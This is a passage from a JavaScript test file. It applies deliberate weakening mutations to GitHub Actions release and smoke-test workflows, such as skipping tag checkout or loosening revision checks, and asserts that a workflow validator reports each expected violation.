        = "always() && needs.preflight.result == 'success' && needs.publish.result == 'success'"
        + " && needs.marketplace-publish.outputs.catalog_published == 'true'";
    }, /plugin-release\.yml post-publish smoke must require a successful publish without gating on marketplace-publish in any form/u],
    ["post-publish closeout gates on the catalog output instead of the job result", workflows => {
      workflows.get(releaseFile).jobs["post-publish-closeout"].if
        = "inputs.publish_release && needs.marketplace-publish.outputs.catalog_published == 'true'";
    }, /post-publish closeout must not gate on marketplace-publish succeeding/u],

    // --- A revision test that measures length instead of immutability ---
    ["delivery state accepts any forty characters as a revision", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        `printf '%s' "$marketplace_revision" | grep -Eq '^[0-9a-f]{40}$'`,
        `test "$(printf '%s' "$marketplace_revision" | wc -c | tr -d ' ')" = 40`,
      );
    }, /must run printf '%s' "\$marketplace_revision" \| grep -Eq/u],
    ["plugin lane delivery state accepts any forty characters as a revision", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        `printf '%s' "$marketplace_revision" | grep -Eq '^[0-9a-f]{40}$'`,
        `test "$(printf '%s' "$marketplace_revision" | wc -c | tr -d ' ')" = 40`,
      );
    }, /must run printf '%s' "\$marketplace_revision" \| grep -Eq/u],
    ["install step accepts any forty characters as a revision", workflows => {
      const step = draftStep(smokeJob(workflows), "Resolve the published plugin through the marketplace catalog");
      step.run = step.run.replace(
        `printf '%s' "$marketplace_revision" | grep -Eq '^[0-9a-f]{40}$'`,
        `test "$(printf '%s' "$marketplace_revision" | wc -c | tr -d ' ')" = 40`,
      );
    }, /must run printf '%s' "\$marketplace_revision" \| grep -Eq/u],
    ["release preflight accepts any forty characters as a live revision", workflows => {
      const step = draftStep(
        workflows.get(releaseFile).jobs.preflight,
        "Prove the public marketplace install path",
      );
      step.run = step.run.replace(
        `printf '%s' "$marketplace_revision" | grep -Eq '^[0-9a-f]{40}$'`,
        `test "$(printf '%s' "$marketplace_revision" | wc -c | tr -d ' ')" = 40`,
      );
    }, /must run printf '%s' "\$marketplace_revision" \| grep -Eq/u],

    // --- The smoke verifying its own workspace against itself ---
    ["smoke stops checking out the published tag", workflows => {
      const checkout = smokeJob(workflows).steps
        .find(step => String(step.uses ?? "").startsWith("actions/checkout@"));
      delete checkout.with;
    }, /post-publish-release-smoke\.yml post-publish smoke must check out the published release tag/u],
    ["plugin lane smoke stops checking out the published tag", workflows => {
      const checkout = pluginSmokeJob(workflows).steps
        .find(step => String(step.uses ?? "").startsWith("actions/checkout@"));
      delete checkout.with;
    }, /plugin-release\.yml post-publish smoke must check out the published release tag/u],
    ["plugin lane smoke checks out its own head instead of the tag", workflows => {
      const checkout = pluginSmokeJob(workflows).steps
        .find(step => String(step.uses ?? "").startsWith("actions/checkout@"));
      checkout.with = { ref: "${{ github.sha }}", "fetch-depth": 0 };
    }, /plugin-release\.yml post-publish smoke must check out the published release tag/u],
    ["smoke stops making GitHub confirm the release is published", workflows => {
      const job = smokeJob(workflows);
      job.steps = job.steps.filter(({ name }) => name !== "Bind this smoke to the published release");
    }, /post-publish-release-smoke\.yml must contain named step Bind this smoke to the published release/u],
    ["plugin lane smoke stops making GitHub confirm the release is published", workflows => {
      const job = pluginSmokeJob(workflows);
      job.steps = job.steps.filter(({ name }) => name !== "Bind this smoke to the published release");
    }, /plugin-release\.yml must contain named step Bind this smoke to the published release/u],
    ["published binding stops comparing GitHub's commit with the checked-out tree", workflows => {
      const step = draftStep(smokeJob(workflows), "Bind this smoke to the published release");
      step.run = step.run.replace(
        'if [ "$published_commit" != "$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)" ]; then',
        "if false; then",
      );
    }, /must run if \[ "\$published_commit" != "\$\(git -C "\$GITHUB_WORKSPACE" rev-parse HEAD\)" \]; then/u],
    ["published binding accepts a draft release", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Bind this smoke to the published release");
      step.run = step.run.replace('gh release view "$TAG"', 'gh release list "$TAG"');
    }, /plugin-release\.yml step Bind this smoke to the published release must run gh release view/u],
    ["deferred fixture is pinned to the run's own head again", workflows => {
      const step = draftStep(smokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        '--commit "$published_commit"',
        '--commit "$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)"',
      );
    }, /must run --commit "\$published_commit"/u],
    ["plugin lane deferred fixture is pinned to the run's own head again", workflows => {
      const step = draftStep(pluginSmokeJob(workflows), "Record catalog delivery state");
      step.run = step.run.replace(
        '--commit "$published_commit"',
        '--commit "$(git -C "$GITHUB_WORKSPACE" rev-parse HEAD)"',
      );
    }, /must run --commit "\$published_commit"/u],
    ["delivery state stops reading the published commit binding", workflows => {
      delete draftStep(smokeJob(workflows), "Record catalog delivery state").env.PUBLISHED_COMMIT;
    }, /must pin the commit resolved from the published release/u],
    ["plugin lane delivery state stops reading the published commit binding", workflows => {
      delete draftStep(pluginSmokeJob(workflows), "Record catalog delivery state").env.PUBLISHED_COMMIT;
    }, /plugin-release\.yml catalog delivery state must pin the commit resolved from the published release/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows);
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, [], name);
      assert.match(violations.join("\n"), expectedReason, name);
    });
  }
});
